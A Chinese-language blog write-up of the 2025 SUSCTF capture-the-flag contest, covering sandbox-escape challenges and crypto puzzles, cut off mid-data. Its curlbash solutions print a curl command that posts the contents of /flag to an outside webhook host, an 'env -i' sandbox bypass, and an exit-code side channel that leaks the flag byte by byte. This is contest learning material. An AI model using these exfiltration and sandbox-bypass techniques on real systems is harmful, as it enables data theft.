[{"title":"2025 SUSCTF题解","url":"/2025/10/09/2025%20SUSCTF%E9%A2%98%E8%A7%A3/","content":"前言又来打我们学校的比赛了，在一年的学习之后，感觉自己强了一点，不过主要是因为今年没什么研究生师傅一起竞技，原来去年才是特例啊。\n\n以及虽然没有很多研究生大佬，但是今年有新生大佬，很难想象大一新生也能排到榜里靠上的位置，我们这些前浪要被拍死在沙滩上了。\n官方wp已经发布在https://seusus.com/susctf-2025-official-writeup\n正文misc我本是misc手，但是这团misc一点都不会。Questionnaire是比赛的问卷，跳过。\neasyjail##################main.pyimport subprocessimport osimport hashlibimport requestsROOT = &quot;/app&quot;TEST_SCRIPT_PATH = &quot;testscript.sh&quot;def hash_file(path):    h = hashlib.sha256()    with open(path, &quot;rb&quot;) as f:        while chunk := f.read(8192):            h.update(chunk)    return h.hexdigest()def snapshot_directory(*paths):    file_hashes = &#123;&#125;    for path in paths:        for root, dirs, files in os.walk(path):            for f in files:                full_path = os.path.join(root, f)                try:                    file_hashes[full_path] = hash_file(full_path)                except Exception:                    pass    return file_hashesdef fetch(url):    r = requests.get(url)    r.raise_for_status()    return r.textdef write_script_to_chroot(script_path, script_content):    content = &quot;readonly LD_PRELOAD\\n&quot; + script_content    script_file = os.path.join(ROOT, script_path)    with open(script_file, &quot;w&quot;) as f:        f.write(content)    os.chmod(script_file, 0o755)def run_bash_script_sandbox(script_path):    script_path = os.path.join(ROOT, script_path)    env = &#123;&quot;LD_PRELOAD&quot;: &quot;./override.so&quot;&#125;    sandbox_cmd = [&quot;bash&quot;, &quot;-re&quot;, script_path]    result = subprocess.run(sandbox_cmd, capture_output=True, text=True, env=env)    return resultdef main():    url = input(&quot;Your script: &quot;)    s = fetch(url)    write_script_to_chroot(TEST_SCRIPT_PATH, s)    # Snapshot root filesystem before running script    root_snapshot_before = snapshot_directory(ROOT, &quot;/tmp&quot;, &quot;/dev/shm&quot;)    # Run script sandboxed    result = run_bash_script_sandbox(TEST_SCRIPT_PATH)    print(&quot;Script stdout:&quot;, result.stdout)    print(&quot;Script stderr:&quot;, result.stderr)    print(&quot;Exit code:&quot;, result.returncode)    if result.returncode != 0:        print(&quot;Ah-oh exit code. You fail!&quot;)        exit(1)    # Snapshot root filesystem after running script    root_snapshot_after = snapshot_directory(ROOT, &quot;/tmp&quot;, &quot;/dev/shm&quot;)    # Compare snapshots for any changes    changed_files = []    for fpath, hsh in root_snapshot_before.items():        if fpath in root_snapshot_after:            if root_snapshot_after[fpath] != hsh:                changed_files.append(fpath)        else:            changed_files.append(fpath + &quot; (deleted)&quot;)    new_files = [f for f in root_snapshot_after if f not in root_snapshot_before]    if not changed_files and not new_files:        print(&quot;No disk files were modified by the script. Good!&quot;)    else:        print(f&quot;Files changed: &#123;changed_files&#125;&quot;)        print(f&quot;New files: &#123;new_files&#125;&quot;)        print(&quot;Some disk files were modified. You fail.&quot;)        exit(1)if __name__ == &quot;__main__&quot;:    main()\n##################override.c#define _POSIX_C_SOURCE 200809L#include &lt;arpa/inet.h&gt;#include &lt;dlfcn.h&gt;#include &lt;errno.h&gt;#include &lt;fcntl.h&gt;#include &lt;linux/openat2.h&gt;#include &lt;netinet/in.h&gt;#include &lt;stdarg.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;sys/socket.h&gt;#include &lt;sys/types.h&gt;typedef int (*open_func_t)(const char *, int, ...);typedef int (*openat_func_t)(int, const char *, int, ...);typedef int (*openat2_func_t)(int, const char *, struct open_how *, size_t);typedef int (*io_uring_setup_t)(unsigned int, void *);typedef int (*io_uring_enter_t)(unsigned int, unsigned int, unsigned int,                                unsigned int, void *);typedef int (*connect_func_t)(int, const struct sockaddr *, socklen_t);int open(const char *pathname, int flags, ...) &#123;  static open_func_t real_open = NULL;  if (!real_open) &#123;    real_open = (open_func_t)dlsym(RTLD_NEXT, &quot;open&quot;);  &#125;  if (pathname &amp;&amp; strstr(pathname, &quot;flag&quot;) != NULL) &#123;    errno = EPERM;    return -1;  &#125;  if ((flags &amp; O_PATH) == O_PATH) &#123;    errno = EPERM;    return -1;  &#125;  mode_t mode = 0;  if (flags &amp; O_CREAT) &#123;    va_list args;    va_start(args, flags);    mode = va_arg(args, mode_t);    va_end(args);    return real_open(pathname, flags, mode);  &#125;  return real_open(pathname, flags);&#125;int openat(int dirfd, const char *pathname, int flags, ...) &#123;  static openat_func_t real_openat = NULL;  if (!real_openat) &#123;    real_openat = (openat_func_t)dlsym(RTLD_NEXT, &quot;openat&quot;);  &#125;  if (pathname &amp;&amp; strstr(pathname, &quot;flag&quot;) != NULL) &#123;    errno = EPERM;    return -1;  &#125;  if ((flags &amp; O_PATH) == O_PATH) &#123;    errno = EPERM;    return -1;  &#125;  mode_t mode = 0;  if (flags &amp; O_CREAT) &#123;    va_list args;    va_start(args, flags);    mode = va_arg(args, mode_t);    va_end(args);    return real_openat(dirfd, pathname, flags, mode);  &#125;  return real_openat(dirfd, pathname, flags);&#125;int openat2(int dirfd, const char *pathname, struct open_how *how,            size_t size) &#123;  typedef int (*openat2_func_t)(int, const char *, struct open_how *, size_t);  static openat2_func_t real_openat2 = NULL;  if (!real_openat2) &#123;    real_openat2 = (openat2_func_t)dlsym(RTLD_NEXT, &quot;openat2&quot;);  &#125;  if (pathname &amp;&amp; strstr(pathname, &quot;flag&quot;) != NULL) &#123;    errno = EPERM;    return -1;  &#125;  if ((how-&gt;flags &amp; O_PATH) == O_PATH) &#123;    errno = EPERM;    return -1;  &#125;  return real_openat2(dirfd, pathname, how, size);&#125;int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen) &#123;  static connect_func_t real_connect = NULL;  if (!real_connect) &#123;    real_connect = (connect_func_t)dlsym(RTLD_NEXT, &quot;connect&quot;);  &#125;  if (addr-&gt;sa_family == AF_INET &amp;&amp; addrlen &gt;= sizeof(struct sockaddr_in)) &#123;    struct sockaddr_in new_addr = *(struct sockaddr_in *)addr;    new_addr.sin_addr.s_addr = inet_addr(&quot;127.0.0.1&quot;);    return real_connect(sockfd, (struct sockaddr *)&amp;new_addr, addrlen);  &#125;  errno = EAFNOSUPPORT;  return -1;&#125;int io_uring_setup(unsigned int entries, void *params) &#123;  errno = EPERM;  return -1;&#125;int io_uring_enter(unsigned int fd, unsigned int to_submit,                   unsigned int min_complete, unsigned int flags, void *sig) &#123;  errno = EPERM;  return -1;&#125;\n##################run.sh#!/bin/shif [ -z &quot;$GZCTF_FLAG&quot; ]; then    export GZCTF_FLAG=&quot;susctf&#123;testflag&#125;&quot;fiecho &quot;$GZCTF_FLAG&quot; &gt;/flagexport GZCTF_FLAG=&quot;&quot;echo &quot;Blocked by ctf_xinetd&quot; &gt;/etc/banner_failchmod 444 /flaginetd -fsleep infinity\nmain.py是主要的交互部分，它从我们输入的url上获取脚本，在一个有限制的沙箱中运行，并给出输出流、错误流和退出代码。最后检查根目录、/tmp和/dev/shm下有没有文件被改变，并告知用户。\n沙箱中调整了open，openat和openat2，打开的文件名不能包含”flag”，标志flag中不能包含O_PATH位，因此无法读取根目录的/flag文件，也不能获取文件描述符。同时，沙箱控制了所有的网络连接，对于ipv4，将目标地址强制设置为127.0.0.1；对于非ipv4的连接，则直接报错，因此不能够利用网络向外传输信息。最后，它禁用了io_uring，不能使用这个I/O接口。\n不过幸运的是，subprocess.run(sandbox_cmd, capture_output=True, text=True, env=env)表明对于沙箱的限制都写在env环境变量中，因此我们可以执行一个不包含这个环境变量的进程，在新的进程中读取flag。\n实际代码如下：env -i cat /flag 。其中-i参数表示忽略环境变量，因此可以执行cat /flag。将脚本存储在可被服务器读取的地方（如pastebin.com），并让服务器执行即可。\n\ncurlbashimport subprocessimport osimport hashlibimport requestsROOT = &quot;/app&quot;TEST_SCRIPT_PATH = &quot;testscript.sh&quot;CURLBASH = &quot;&quot;&quot;#!/bin/bashcurl -fsSL &#123;url&#125; | bash -re&quot;&quot;&quot;def hash_file(path):    h = hashlib.sha256()    with open(path, &quot;rb&quot;) as f:        while chunk := f.read(8192):            h.update(chunk)    return h.hexdigest()def snapshot_directory(*paths):    file_hashes = &#123;&#125;    for path in paths:        for root, dirs, files in os.walk(path):            for f in files:                full_path = os.path.join(root, f)                try:                    file_hashes[full_path] = hash_file(full_path)                except Exception:                    pass    return file_hashesdef fetch(url):    result = requests.get(url)    result.raise_for_status()    return result.textdef fetch_with_curl(url):    result = subprocess.run([&quot;curl&quot;, &quot;-fsSL&quot;, url], capture_output=True, text=True)    if result.returncode != 0:        print(&quot;Failed to download script!&quot;)        exit(1)    return result.stdoutdef write_script_to_chroot(script_path, script_content):    content = &quot;readonly LD_PRELOAD\\n&quot; + script_content    script_file = os.path.join(ROOT, script_path)    with open(script_file, &quot;w&quot;) as f:        f.write(content)    os.chmod(script_file, 0o755)def run_bash_script(script_path, sandbox=True):    script_path = os.path.join(ROOT, script_path)    sandbox_cmd = [&quot;/bin/bash&quot;, &quot;-re&quot;, script_path]    if sandbox:        # qemu-x86_64 is a safe sandbox with isolated network &amp; filesystem        # try locally with &quot;unshare -n&quot;        sandbox_cmd.insert(0, &quot;qemu-x86_64&quot;)    result = subprocess.run(sandbox_cmd, capture_output=True, text=True)    # print(&quot;Script stdout:&quot;, result.stdout)    # print(&quot;Script stderr:&quot;, result.stderr)    print(&quot;Exit code:&quot;, result.returncode)    if result.returncode != 0:        print(&quot;Ah-oh exit code. You fail!&quot;)        exit(1)def run_sandboxed(url):    # fetch first    s = fetch_with_curl(url)    if s != fetch(url):        print(&quot;WTH did you give me?&quot;)        exit(1)    write_script_to_chroot(TEST_SCRIPT_PATH, s)    # Snapshot root filesystem before running script    root_snapshot_before = snapshot_directory(ROOT, &quot;/tmp&quot;, &quot;/dev/shm&quot;)    # Run script sandboxed    run_bash_script(TEST_SCRIPT_PATH)    # Snapshot root filesystem after running script    root_snapshot_after = snapshot_directory(ROOT, &quot;/tmp&quot;, &quot;/dev/shm&quot;)    # Compare snapshots for any changes    changed_files = []    for fpath, hsh in root_snapshot_before.items():        if fpath in root_snapshot_after:            if root_snapshot_after[fpath] != hsh:                changed_files.append(fpath)        else:            changed_files.append(fpath + &quot; (deleted)&quot;)    new_files = [f for f in root_snapshot_after if f not in root_snapshot_before]    if not changed_files and not new_files:        print(&quot;No disk files were modified by the script. Good!&quot;)    else:        print(f&quot;Files changed: &#123;changed_files&#125;&quot;)        print(f&quot;New files: &#123;new_files&#125;&quot;)        print(&quot;Some disk files were modified. You fail.&quot;)        exit(1)def run_curlbash(url):    write_script_to_chroot(TEST_SCRIPT_PATH, CURLBASH.format(url=url))    run_bash_script(TEST_SCRIPT_PATH, sandbox=False)def main():    url = input(&quot;Your script: &quot;)    # Run random times in sandbox (to make sure you are not spoofing)    random_index = int.from_bytes(os.urandom(1), &quot;big&quot;) % 32    for i in range(random_index):        print(f&quot;[Round &#123;i&#125;]&quot;, end=&quot; &quot;)        run_sandboxed(url)    # Since the content is safe, do it in curlbash this time    print(f&quot;[Round &#123;random_index&#125; CURLBASH]&quot;, end=&quot; &quot;)    run_curlbash(url)if __name__ == &quot;__main__&quot;:    main()\n与上一题类似，但是这个环境绕不过了，一定会先在qemu中运行若干个回合，才会在宿主机运行一回。同时，没有输出流和错误流，只保留了退出代码的输出，因此，虽然cat /flag可以直接运行了，但是得不到输出，没有用。\n这题被我发现了漏洞，实现了一个非预期。至于预期解，出题人说这题废了，没有预期解，所以revenge里面我也只能提供我的解法。\n第一步，程序先检测curl获取的脚本和request获取的是否一致，如果不一致则直接报错。考虑到request库和curl实现上的差异，建议将脚本编成一行。\n第二步，由于回显只有退出代码，必须采用其他方式输出，如果考虑使用网络传输，qemu没有网，必须由宿主机执行命令，而在qemu应当绕过。\n因此，我们利用webhook.site接收服务器回传的flag，并使用||exit 0绕过qemu的报错。完整脚本如下：curl -X POST --data &quot;$(cat /flag)&quot; &quot;https://webhook.site/your_address&quot; || exit 0\n同样上传到pastebin，发送至服务器即可通过每一轮qemu中的验证，让宿主机发出flag。\ncurlbash-revenge在和出题人交流过后他们成功根据我的思路部署了反制措施，现在使用||exit 0不顶用了。但是退出代码还是可以控制的，尝试了exit 1和exit 123456等多轮测试后，发现退出代码可以是0-255，在exit 256时就会回到exit 0。这个范围足够大，可以覆盖所有可打印字符，因此我们利用退出代码进行回显，不断请求服务器，让其给出flag的每一位。\nif test -f /flag; then char=$(cut -c 57 /flag); case &quot;$char&quot; in &#x27;&#x27;) exit 0;; &#x27;a&#x27;) exit 10;; &#x27;b&#x27;) exit 11;; &#x27;c&#x27;) exit 12;; &#x27;d&#x27;) exit 13;; &#x27;e&#x27;) exit 14;; &#x27;f&#x27;) exit 15;; &#x27;g&#x27;) exit 16;; &#x27;h&#x27;) exit 17;; &#x27;i&#x27;) exit 18;; &#x27;j&#x27;) exit 19;; &#x27;k&#x27;) exit 20;; &#x27;l&#x27;) exit 21;; &#x27;m&#x27;) exit 22;; &#x27;n&#x27;) exit 23;; &#x27;o&#x27;) exit 24;; &#x27;p&#x27;) exit 25;; &#x27;q&#x27;) exit 26;; &#x27;r&#x27;) exit 27;; &#x27;s&#x27;) exit 28;; &#x27;t&#x27;) exit 29;; &#x27;u&#x27;) exit 30;; &#x27;v&#x27;) exit 31;; &#x27;w&#x27;) exit 32;; &#x27;x&#x27;) exit 33;; &#x27;y&#x27;) exit 34;; &#x27;z&#x27;) exit 35;; &#x27;A&#x27;) exit 36;; &#x27;B&#x27;) exit 37;; &#x27;C&#x27;) exit 38;; &#x27;D&#x27;) exit 39;; &#x27;E&#x27;) exit 40;; &#x27;F&#x27;) exit 41;; &#x27;G&#x27;) exit 42;; &#x27;H&#x27;) exit 43;; &#x27;I&#x27;) exit 44;; &#x27;J&#x27;) exit 45;; &#x27;K&#x27;) exit 46;; &#x27;L&#x27;) exit 47;; &#x27;M&#x27;) exit 48;; &#x27;N&#x27;) exit 49;; &#x27;O&#x27;) exit 50;; &#x27;P&#x27;) exit 51;; &#x27;Q&#x27;) exit 52;; &#x27;R&#x27;) exit 53;; &#x27;S&#x27;) exit 54;; &#x27;T&#x27;) exit 55;; &#x27;U&#x27;) exit 56;; &#x27;V&#x27;) exit 57;; &#x27;W&#x27;) exit 58;; &#x27;X&#x27;) exit 59;; &#x27;Y&#x27;) exit 60;; &#x27;Z&#x27;) exit 61;; &#x27;0&#x27;) exit 62;; &#x27;1&#x27;) exit 63;; &#x27;2&#x27;) exit 64;; &#x27;3&#x27;) exit 65;; &#x27;4&#x27;) exit 66;; &#x27;5&#x27;) exit 67;; &#x27;6&#x27;) exit 68;; &#x27;7&#x27;) exit 69;; &#x27;8&#x27;) exit 70;; &#x27;9&#x27;) exit 71;; &#x27;_&#x27;) exit 72;; &#x27;-&#x27;) exit 73;; &#x27;+&#x27;) exit 74;; &#x27;=&#x27;) exit 75;; &#x27;&#123;&#x27;) exit 76;; &#x27;&#125;&#x27;) exit 77;; &#x27;[&#x27;) exit 78;; &#x27;]&#x27;) exit 79;; &#x27;(&#x27;) exit 80;; &#x27;)&#x27;) exit 81;; &#x27;*&#x27;) exit 82;; &#x27;&amp;&#x27;) exit 83;; &#x27;^&#x27;) exit 84;; &#x27;%&#x27;) exit 85;; &#x27;$&#x27;) exit 86;; &#x27;#&#x27;) exit 87;; &#x27;@&#x27;) exit 88;; &#x27;!&#x27;) exit 89;; &#x27;~&#x27;) exit 90;; &#x27;|&#x27;) exit 91;; &#x27;:&#x27;) exit 92;; &#x27;;&#x27;) exit 93;; &#x27;,&#x27;) exit 94;; &#x27;.&#x27;) exit 95;; &#x27;/&#x27;) exit 96;; &#x27;&lt;&#x27;) exit 97;; &#x27;&gt;&#x27;) exit 98;; &#x27;?&#x27;) exit 99;; &#x27;\\&#x27;) exit 100;; &quot;&#x27;&quot;) exit 101;; &#x27;&quot;&#x27;) exit 102;; *) exit 3;; esac; fi\n为了防止qemu中没有/flag导致代码不能工作，最前面有if语句进行排除。代码主要通过cut -c xx /flag部分提取出/flag的每一位，并与所有可打印字符进行比对，根据错误码得到对应位置的信息。\n以及非常难过的是，qemu中也有/flag，但是内容是susctf&#123;fake_flag&#125;，为了避免读到qemu中的文件就报错，需要将每一位对应的exit xx修改为0。由于原始代码没有返回0的分支，这个临时的0不会和其他字符混淆。经过勤劳的遍历，flag一共有57位，不得不说这个方法还是有些低效的。\n赛后与其他师傅交流，其实上面发送flag的思路也可以继续用，laboon师傅提出可以让代码判断自身在qemu运行还是在宿主机运行，在宿主机运行才发送，这样比我此前简单地|| exit 0应该更健壮，受益匪浅。\n\n（此处为最后一位，返回代码77对应的是’}’）\neat-mian又是一个OJ啊啊啊啊，去年仅1解的OJ (Orange Juice)还历历在目，今年框架都没变，于是致敬一下去年的正解——\n\n但是今年的我(AI)早就不是去年的我(AI)了，直接把题目描述丢给Gemini，它就会告诉我，在预编译阶段，有一个“符号连接”的操作符##，可以绕开不允许出现int和main的限制。\n\n将变化后的代码用#define变回去就可以得到flag了——我们仍未知道flag被存放在了哪里。\nsignin签到题，大概是我们海报的原稿，加了点东西就是misc题了，题就是这么好出（×）\n\n在一堆灰白的字中有一个susctf开头的透明字，鼠标扒拉扒拉就能看到了，唯一难点应该是.ai文件和人工智能没关系（）它是Adobe Illustrator的文件格式。美工人狂喜，电脑里本来就有AI\nCrypto代码基本都是AI写的，我只能大致明白思路……其实不能完全看懂，所以也不会缩减，导致每道题都特别长。\n01-All U Needn=2941187500626100000000000000000096722058862370000000000000000001044274909577110000000000000000015573575404024600000000000000000171146406712341000000000000000001930245944570620000000000000000025760100923677100000000000000000277371363421722000000000000000003054750478471270000000000000000035899269818100000000000000000000349504486312827000000000000000004416107975113120000000000000000045159437561331900000000000000000478278579950862000000000000000005201068719280110000000000000000055395991229465600000000000000000575427264362311000000000000000006513899157891840000000000000000068138580040670900000000000000000700010100085102000000000000000007449678280649610000000000000000076179301616911000000000000000000848825344827111000000000000000009147528156886200000000000000000096916670048442100000000000000001012695491123924000000000000000010191376824152950000000000000000101921523818312200000000000000001090906528164867000000000000000010818660687278780000000000000000114494912265499100000000000000001164939172364714000000000000000012240810178674610000000000000000116157458128710400000000000000001133872977471815000000000000000010558262104734340000000000000000103419184748331500000000000000001044264742306912000000000000000010186125008047950000000000000000095524362764015000000000000000000925195844257991000000000000000008524721514180660000000000000000084244161241166500000000000000000830468755024986000000000000000007624760085725490000000000000000076981945972714200000000000000000747851012643443000000000000000006794764467668420000000000000000062532460088466500000000000000000579998461987310000000000000000005544771313728490000000000000000050476404913277600000000000000000526223490724127000000000000000004716072135866840000000000000000044222349447237500000000000000000388984855995114000000000000000002999863906983770000000000000000021959129120257200000000000000000237144904003813000000000000000001758831932677180000000000000000018600782750857900000000000000000139537141588822000000000000000001041336657419230000000000000000008113148344575000000000000000000043849510632891e=2906394483919609876718245053652108240802816443654616570596682960056808336790951023665436900644365903659469395107610861811395487908359598931024764867783668598175618146070568166725395945846336528660593938878088074175368940125303446833806253827725576660603146160007926077633080070185804184370653460670499542474209926140850959830662928147081534504640452680743596927639143202106763011511633450412304911872611149284691203494590753332817447973304563995049156481955538016229735794657638604187642026395729393683809232249697844705933283010120794860594266302003916077635513753570820267039903372227762924194963229903775950600612826173365742947144845754327033303700968593908029325991574729319864162867114383090257406360462274758239372652598322110514768234833067030343517976067981681173246285960999251392023910101008419622061741537702746089074868280716357218504600102619616790459363850662290927928570978665465006400532967886379285182577029c=1190448896576674940169048021542568876629909531547690337039288304071116517850672930275366650914788738523635400087439794697320193379914283478921046792067380001414422110093896680403233706041303960499131571084467446744999531531238620915097878236247448563831816076306299266035411290150464451023521946205795799354077689961093204938124787700627137419587910048439692092060991755536424004878133971657053976625603120880490296023782934147849283336384914990141478789471814729184461237469197189114789972562528627795460661045750637448777265275745160713213791683125719306305168709528434878911135471708890268514739189191172559780945596969438601249588555828273347231242560315367718701130952384338051421732999545936059615621501082989575038641220752655741481616002525984081159278879228707270270048788115219379286441398718927616251267986055410142929308050949237931470194218235086747829680939134194106609480707821530668734725940583875631572810960405382694202794384758973969371841409095403097239053549145811053655553996580027708162577179836737117804481940071579653530986075446713256609731230452515686744161134570917712426703991303881001809142572894366883152499870798084538057692204061499100319663916097876614420422576451205125566725055522179037976985019454442424976083632133838833052855738943311351865444660669168591183064653092902121387259300362312466635003594662015601785113887435152765095740855037847111077201694022411838750953848736275821057278487436910657182007150097552289728182766615426847673040720530121660328091282786112392059093980484132511041841724717003899521390308002340216451362913612975425331475263200293326298200724869940602306097253562653741627568455743020479638958773380775489285049262071657097962137786887285544908361861408838935682843240487589708181360394439544072953558605639364102922606931988705631690500269025028799190709417306264422259731384834550871432097000879514617465537308146352338219622159288357654855036297562761852070891002197541993195834291283267903740056270247342537234029389986639757219003301227959585640924085165689420265659085787058337920332842168\n好久没见到这种又短又长的题了，信息很少又很长，尤其是这个n，实在是很难不在意啊。\n但是题解就很难写了，因为只能是“注意到”起手……n由小数字和一些0交替，因此可以试着将n转化为一个多项式f，把分解n的问题转化为分解多项式。经过观察，从最低位开始，每32个数字为一组，刚好可以让所有小数字都落在低位。\n2941187500626100000000000000000096722058862370000000000000000001044274909577110000000000000000015573575404024600000000000000000171146406712341000000000000000001930245944570620000000000000000025760100923677100000000000000000277371363421722000000000000000003054750478471270000000000000000035899269818100000000000000000000349504486312827......先强行将所有0放在高位\n294118750062610000000000000000009672205886237000000000000000000104427490957711000000000000000001557357540402460000000000000000017114640671234100000000000000000193024594457062000000000000000002576010092367710000000000000000027737136342172200000000000000000305475047847127000000000000000003589926981810000000000000000000034950448631282700000000000000000441610797511312......就会发现稍微调整一下，会很整齐\n这样，我们就得到了所有的小系数。由于数字是32位一组，因此多项式$f(x) = 29411875006261x^{64}+96722058862370x^{63}+…$，$n = f(10^{32})$。\n我们试着分解$f(x)$。由于我的sagemath临时罢工了，用Mathematica代替一下，代码当然还是Gemini写的。\n(*---步骤 1:定义多项式的系数---*)(*根据您提供的数据，从最高次项 (x^64) 到常数项 (x^0) 的顺序*)coeffs = &#123;29411875006261, 96722058862370, 104427490957711,  155735754040246, 171146406712341, 193024594457062, 257601009236771, 277371363421722, 305475047847127, 358992698181000, 349504486312827, 441610797511312, 451594375613319, 478278579950862, 520106871928011, 553959912294656, 575427264362311, 651389915789184, 681385800406709, 700010100085102, 744967828064961, 761793016169110, 848825344827111, 914752815688620, 969166700484421, 1012695491123924, 1019137682415295, 1019215238183122, 1090906528164867, 1081866068727878, 1144949122654991, 1164939172364714, 1224081017867461, 1161574581287104, 1133872977471815, 1055826210473434, 1034191847483315, 1044264742306912, 1018612500804795, 955243627640150, 925195844257991, 852472151418066, 842441612411665, 830468755024986, 762476008572549, 769819459727142, 747851012643443, 679476446766842, 625324600884665, 579998461987310, 554477131372849, 504764049132776, 526223490724127, 471607213586684, 442223494472375, 388984855995114, 299986390698377, 219591291202572, 237144904003813, 175883193267718, 186007827508579, 139537141588822, 104133665741923, 81131483445750, 43849510632891&#125;;(*---步骤 2:从系数构建多项式---*)(*使用 FromDigits 函数，这是一种非常高效且优雅的方式*)(*P[x] 代表我们的多项式*)P[x_] := FromDigits[coeffs, x];(*---步骤 3:尝试对多项式进行因式分解---*)(*Factor[] 是 Mathematica 中用于因式分解的核心函数*)(*我们使用 Timing[] 来测量计算所需的时间*)Print[&quot;正在尝试分解多项式...&quot;];result = Timing[Factor[P[x]]];(*---步骤 4:显示结果---*)Print[&quot;计算耗时: &quot;, result[[1]], &quot; 秒&quot;];Print[&quot;分解结果:&quot;];result[[2]]####################################################分解结果：(6406713 + 9553797 x + 5845799 x^2 + 4190775 x^3 + 7190749 x^4 +    2115569 x^5 + 8795931 x^6 + 4833343 x^7 + 6591197 x^8 +    8995631 x^9 + 9256951 x^10 + 5850379 x^11 + 7268673 x^12 +    4965579 x^13 + 9424191 x^14 + 6285533 x^15 + 6849663 x^16 +    4159993 x^17 + 7073919 x^18 + 6515847 x^19 + 3318105 x^20 +    8434387 x^21 + 3595731 x^22 + 5727693 x^23 + 3780489 x^24 +    3377355 x^25 + 6632605 x^26 + 4820231 x^27 + 5152863 x^28 +    6497639 x^29 + 2353095 x^30 + 7461845 x^31 +    2997863 x^32) (6844307 + 2457167 x + 6344587 x^2 + 5599625 x^3 +    5604721 x^4 + 4817655 x^5 + 3724917 x^6 + 3741569 x^7 +    8948705 x^8 + 9649919 x^9 + 6464695 x^10 + 8570943 x^11 +    4311675 x^12 + 3772115 x^13 + 2850975 x^14 + 5503773 x^15 +    6502209 x^16 + 4529349 x^17 + 9430051 x^18 + 2652377 x^19 +    7055707 x^20 + 6603971 x^21 + 5023657 x^22 + 4761113 x^23 +    9674989 x^24 + 7834229 x^25 + 9056537 x^26 + 5921159 x^27 +    3346885 x^28 + 5586621 x^29 + 7609767 x^30 + 7843685 x^31 +    9810947 x^32)\n我们成功得到了两个多项式$f_1(x)$和$f_2(x)$，好巧不巧，$f_1(10^{32})$和$f_2(10^{32})$都是质数，因此我们分解了n，解密即可。\n03-CrySigninfrom Crypto.Util.number import *from random import *from secret import flagfrom uuid import UUIDp=1329596764371107264260948790524463667078201288962092988229220331099216972202747986235496117149730240332402358728798174199576808159410988077039863933883707283021432596510812652195899704038126374630854432891580277457310166342238907250055728526757955693768208634626765002269557414142205735568171344541059676587026552819564587252379527557854007769644766922798602628730499830452043996042865583066303024746135216694290599886977846557408057361447210602309239731866416103q=664798382185553632130474395262231833539100644481046494114610165549608486101373993117748058574865120166201179364399087099788404079705494038519931966941853641510716298255406326097949852019063187315427216445790138728655083171119453625027864263378977846884104317313382501134778707071102867784085672270529838293513276409782293626189763778927003884822383461399301314365249915226021998021432791533151512373067608347145299943488923278704028680723605301154619865933208051g=25a=randint(3,q-3)for i in range(64):    print(f&#x27;g**(a**&#123;i&#125;)=&#x27;,pow(g,pow(a,i,q),p))f=[randint(3,2**64) for i in range(64)]f[-1]=1fa=0for i in range(64):    fa+=f[i]*pow(a,i,q)%q    fa%=qw=Nonewhile(1):    w=(a+randint(1,q-3))%q    fw=0    for i in range(64):        fw+=f[i]*pow(w,i,q)%q        fw%=q    if(fw):        breakprint(&#x27;f(x)=&#x27;,f)print(&#x27;w=&#x27;,w)print(&#x27;g**(f(a)/(a-w))=&#x27;,pow(g,fa*inverse(a-w,q)%q,p))ANS=pow(g,inverse(a-w,q),p)assert flag==UUID(int=ANS%(2**128))g**(a**0)=25g**(a**1)=138938326329179400579822016861807890152275074052840869513178308442184614752726120794416996726235976129066536780257951537294214323525744969193051509674913741655936382939560999371937428647227336441478465798890891062736322598096346789587118280691486460734758887983260464749333206460021943840739578350204147103615583489429115089997354280178128521599002756786009558249615543759588662110140611646864968779226557132212203458417777184738733482848882652085549811551602750g**(a**2)=787242680703317896225880146578899407317783685008557088960993271481180806579428103064499287971835456370143086063238834791281488271908565121959876237815137682291438451585392821959182203153952321850488871696249587091275651387749479343541532108538357276743401318874969015308527859124376021967975622821288578616875205643710915492778876302534307435227858368811523837684138429580961487399817275903793072214671870100074361675867713122425039930968169456426224190491953655g**(a**3)=144053098067532353457701263379018029159819405496313032361731100252808677300037594667717604007886994334286240396566616626417869616604735249087405267941399853418980301181784794799665920203944311242182713872848453715903353619836502204307521046376274382668297403970708073470753160669701406222697334410467095349085385834932894698432058219959381247293124349268105037433085064906493404792415974031154576497249517512300273267920211401125961100561349245540430964789566962g**(a**4)=1258283244540705640498370512549369272497759742687770775728445735610256099647963023219206198082844942039795483050517009475460920677130670702262878182764961225691181819950973298014325033285604446246570212537835833328036809084339501666549608883654964216130250136698819785388170383783688423703728628205438056573678688538255463710397183023609344381131437248797151751897323088390679334027568249454799880276098520377449297979456908718948532884554110592433722383380062961g**(a**5)=629309690740656243532031635869513308880882274755363632031775311594862331794917515786804640776328409747791116700422814850907010485408047898313819954957504870912477171640565677629456742035021002894606231207255454189349531116042032571381195039263749866811008298040015980000487056571330823197166794627491035204994348940484118445084146500779527088939245040992117880712235921399823971437063023111164755209393997153476709195008441498580411236989092287439776068463202779g**(a**6)=1319779784607766944815219914844081068633769619625827522691222490804143713770021950470156766039484581701210577515002761263702966299361414770543481566258540531284009229162055052932042660761378575759635514838550246026448157919388420589152622236767994965597066371062620040591764464255409007622768927702888592446626272345389220975925028180652817387831098191499013117163277910726876822580240489844771663828224254857422979352504668285213385603519950350940669222938328784g**(a**7)=301262423147272555037432733134804338497424717157843894351639480970154471771867772336801209570415364401267675498479113511682664665340243738981791343635945430027479298094403364432688326523732042778759417426838991683273500756618824584421826862527003789243056307239870418674621467687054397524808305085151395436427026986050975972569331291664826047862809080432239084942767671828279358174547249239067042751478384152001204529458729243518909488188289028306944798939401392g**(a**8)=786049733357710045630275320815701956172769949101473564600694213295393205736677434847720231452624073864283323196200942830671921925208114822626292094023507813702863916463080818161077437417406775565067242919129242263768087807143471672522755946192484746972839949908791462700324441538989491011551078267691731176053157755945381592732635225384097513976383854350364251173878325946474545694990086314166916314431272283230575982393452060505138278290183018494267015217296451g**(a**9)=421972326003139505006263252512659899510713380041485665748323773089073491404219930356060595435392264020923011394607335660444890004824599577635616121412253066259554441478640787881257231028862648105293507915304402258910207040306100366525227806742109918595673571551994272952533499144718163016574344195977785326998366939867652613657053985189305285701232413661747758514610214854542843864164192601578725306178625128499467598167652060689821785054975786813944814233675336g**(a**10)=1222499565395095112485302429729436630721792121050071052184641373949188317435480229852887983111054539368663153572968989271227024332504641394681075114509197221755395910366415425793231156194747270131373198129064930426532818243610710254805045863233985572772518898351210027965363297878990004695894011438994604140493707479218110419424437927758235776746350302046214962709541322609813196997485061835546098433333926990342882191376798058621978589869718944159122169152821833g**(a**11)=13114346429717971986706163968304899482835874793104728595155828919057472552090214611312027533996691352987370932433789309545795367384269662881166796405146860509089486202477406293706498922060512874051115371005970562910611075544190010146270335052112216699989861501015958711653986333899490768730260532655834523524343141